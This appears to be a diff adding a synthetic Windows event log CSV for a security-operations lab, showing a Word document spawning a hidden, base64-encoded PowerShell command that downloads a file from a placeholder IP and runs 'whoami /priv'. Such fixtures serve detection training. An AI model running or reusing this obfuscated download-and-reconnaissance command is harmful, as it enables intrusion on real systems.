@@ -1,0 +1,12 @@
+_time,EventCode,ComputerName,User,ProcessName,ParentProcessName,ProcessId,ParentProcessId,CommandLine,TargetFilename,DestinationIp
+2023-11-15 08:30:00,4688,WIN-SOC-LAB,NT AUTHORITY\SYSTEM,svchost.exe,services.exe,1024,600,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,,
+2023-11-15 08:35:12,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,chrome.exe,explorer.exe,3056,2200,C:\Program Files\Google\Chrome\Application\chrome.exe,,
+2023-11-15 08:45:12,4688,WIN-SOC-LAB,NT AUTHORITY\SYSTEM,splunk-powershell.exe,splunkd.exe,1150,1100,splunk-powershell.exe --ps2,,
+2023-11-15 08:50:00,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,powershell.exe,explorer.exe,3300,2200,powershell.exe -Command Get-Service,,
+2023-11-15 09:12:00,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,WINWORD.EXE,explorer.exe,4400,2200,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE C:\Users\j.doe\Downloads\Invoice_7782.docx,,
+2023-11-15 09:12:01,11,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,WINWORD.EXE,,4400,,,C:\Users\j.doe\AppData\Local\Temp\~wrd001.tmp,
+2023-11-15 09:12:05,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,powershell.exe,WINWORD.EXE,5500,4400,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADAALwB0AGUAcwB0AC4AdAB4AHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAagAuAGQAbwBlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAB0AGUAcwB0AC4AdAB4AHQAIgA7ACAAdwBoAG8AYQBtAGkALgBlAHgAZQAgAC8AcAByAGkAdgA=,,
+2023-11-15 09:12:07,3,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,powershell.exe,,5500,,,,198.51.100.20
+2023-11-15 09:12:08,11,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,powershell.exe,,5500,,,C:\Users\j.doe\AppData\Local\Temp\test.txt,
+2023-11-15 09:12:09,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,whoami.exe,powershell.exe,6600,5500,whoami.exe /priv,,
+2023-11-15 09:20:00,4688,WIN-SOC-LAB,WIN-SOC-LAB\j.doe,notepad.exe,explorer.exe,7100,2200,C:\Windows\System32\notepad.exe,,
